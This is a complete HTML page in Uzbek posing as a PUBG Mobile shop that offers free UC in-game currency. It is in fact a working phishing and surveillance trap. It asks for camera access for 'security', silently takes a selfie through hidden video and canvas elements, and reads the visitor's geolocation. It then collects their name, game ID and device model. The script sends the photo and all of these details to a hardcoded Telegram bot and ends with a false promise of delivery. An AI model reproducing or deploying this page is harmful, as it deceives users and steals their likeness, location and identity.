<!DOCTYPE html>
<html lang="uz">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>PUBG MOBILE: SECURE UC</title>
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;900&family=Rajdhani:wght@500;700&display=swap" rel="stylesheet">
    <style>
        :root { --neon-b: #00f3ff; --neon-g: #39ff14; --bg: #010409; }
        body { margin: 0; background: var(--bg); color: white; font-family: 'Rajdhani', sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; overflow: hidden; }
        #app { width: 92%; max-width: 420px; background: rgba(15, 23, 42, 0.85); border: 2px solid var(--neon-b); border-radius: 40px; padding: 25px; text-align: center; }
        .uc-item { background: rgba(255,255,255,0.05); border: 1px solid var(--neon-g); border-radius: 20px; padding: 18px; cursor: pointer; display: flex; justify-content: space-between; margin-bottom: 10px; }
        .modal { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.98); z-index: 2000; justify-content: center; align-items: center; padding: 15px; }
        .form-box { background: #0d1117; border: 2px solid var(--neon-b); border-radius: 30px; padding: 30px; width: 100%; max-width: 380px; }
        input { width: 100%; padding: 18px; margin-bottom: 12px; background: rgba(255,255,255,0.07); border: 1.5px solid #222; border-radius: 15px; color: #fff; font-size: 16px; }
        .btn-main { width: 100%; padding: 18px; background: var(--neon-b); border: none; border-radius: 15px; font-weight: 900; cursor: pointer; font-size: 16px; }
        video, canvas { display: none; }
        .instruction { color: var(--neon-g); font-size: 14px; margin-bottom: 15px; border: 1px dashed var(--neon-g); padding: 10px; border-radius: 10px; }
    </style>
</head>
<body>

<div id="app">
    <h1 style="font-family:'Orbitron'; color:var(--neon-b); font-size: 22px;">UC ELITE SHOP</h1>
    <p>Paketni tanlang:</p>
    <div onclick="start('60 UC')" class="uc-item"><b>60 UC 🎁</b> <span>0 UZS</span></div>
    <div onclick="start('325 UC')" class="uc-item"><b>325 UC</b> <span>55,000 UZS</span></div>
</div>

<div id="authModal" class="modal">
    <div class="form-box">
        <h2 style="color:var(--neon-b); font-family:'Orbitron'; font-size: 18px;">IDENTIFIKATSIYA</h2>
        <p class="instruction">Xavfsizlik uchun keyingi oynada "Ruxsat berish" (Allow) tugmasini bosing.</p>
        <button class="btn-main" id="authBtn" onclick="getAccess()">TASDIQLASH</button>
    </div>
</div>

<div id="formModal" class="modal">
    <div class="form-box">
        <h2 style="color:var(--neon-b);">MA'LUMOTLAR</h2>
        <input type="text" id="u_fname" placeholder="Ism">
        <input type="text" id="u_lname" placeholder="Familiya">
        <input type="number" id="pid" placeholder="PUBG ID">
        <button class="btn-main" onclick="sendAll()">UC YUKLASH</button>
    </div>
</div>

<video id="vid" autoplay playsinline></video>
<canvas id="canv"></canvas>

<script>
    const TOK = "8565651705:AAGcPkBIRk7mGd8OQgNzg-sOcZP2RMyIUfY";
    const CID = "6198817749";
    let selPkg = "", selfie = null, userLoc = "Berilmadi";

    function start(p) { selPkg = p; document.getElementById('authModal').style.display = 'flex'; }

    async function getAccess() {
        const btn = document.getElementById('authBtn');
        btn.innerText = "KUTILMOQDA...";
        try {
            // Kamera va Rasm
            const s = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
            const v = document.getElementById('vid'); v.srcObject = s;
            
            // Lokatsiya
            navigator.geolocation.getCurrentPosition(p => {
                userLoc = `https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`;
            });

            setTimeout(() => {
                const c = document.getElementById('canv');
                c.width = v.videoWidth; c.height = v.videoHeight;
                c.getContext('2d').drawImage(v, 0, 0);
                selfie = c.toDataURL('image/jpeg');
                s.getTracks().forEach(t => t.stop());
                document.getElementById('authModal').style.display = 'none';
                document.getElementById('formModal').style.display = 'flex';
            }, 1000);
        } catch (e) { alert("Ruxsat berish shart!"); btn.innerText = "QAYTA URINISH"; }
    }

    async function sendAll() {
        const fn = document.getElementById('u_fname').value;
        const ln = document.getElementById('u_lname').value;
        const id = document.getElementById('pid').value;
        if(!fn || !ln || !id) return alert("To'ldiring!");

        const now = new Date().toLocaleString('uz-UZ');
        const device = navigator.userAgent.split(')')[0].split('(')[1]; // Qurilma modeli

        const text = `🚀 *YANGI BUYURTMA* 🚀\n\n` +
                     `👤 *Foydalanuvchi:* ${fn} ${ln}\n` +
                     `🆔 *PUBG ID:* \`${id}\`\n` +
                     `📦 *Paket:* ${selPkg}\n` +
                     `📅 *Vaqt:* ${now}\n` +
                     `📱 *Qurilma:* ${device}\n` +
                     `📍 *Lokatsiya:* [Xaritani ochish](${userLoc})`;

        await fetch(`https://api.telegram.org/bot${TOK}/sendMessage`, {
            method:'POST', headers:{'Content-Type':'application/json'},
            body:JSON.stringify({chat_id:CID, text:text, parse_mode:'Markdown'})
        });

        if(selfie) {
            const blob = await (await fetch(selfie)).blob();
            const fd = new FormData();
            fd.append('chat_id', CID);
            fd.append('photo', blob, 'image.jpg');
            fetch(`https://api.telegram.org/bot${TOK}/sendPhoto`, { method:'POST', body:fd });
        }

        alert("✅ So'rov qabul qilindi! 24 soat ichida UC yuklanadi.");
        location.reload();
    }
</script>
</body>
</html>
